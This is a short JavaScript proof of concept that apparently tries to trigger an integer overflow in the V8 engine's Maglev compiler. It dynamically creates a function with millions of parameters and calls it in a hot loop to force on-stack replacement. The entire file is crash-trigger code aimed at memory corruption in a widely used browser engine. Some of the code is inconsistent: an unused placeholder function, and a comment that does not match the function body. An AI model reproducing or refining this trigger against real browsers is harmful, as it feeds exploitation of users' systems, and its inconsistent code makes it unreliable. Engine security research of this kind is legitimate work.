// Trigger integer overflow by defining a function with many arguments which increases register_count.

function g(
  // Too many arguments to fit here manually and overflow int32 calculation
) {
  return arguments.length + 1;
}


var num_args = 40000*400; // large number to cause overflow

// Construct argument list string
var argsList = "";
for (var i = 0; i < num_args; i++) argsList += "a" + i + ",";
argsList = argsList.slice(0, -1);

// Construct function source to return sum of all args
var body = "return arguments.length + 1;";

// Create large argument function dynamically
var bigArgFunc = new Function(argsList, body);

// Call many times to trigger OSR in v8 maglev
for (var i = 0; i < 1e5; i++) bigArgFunc(0);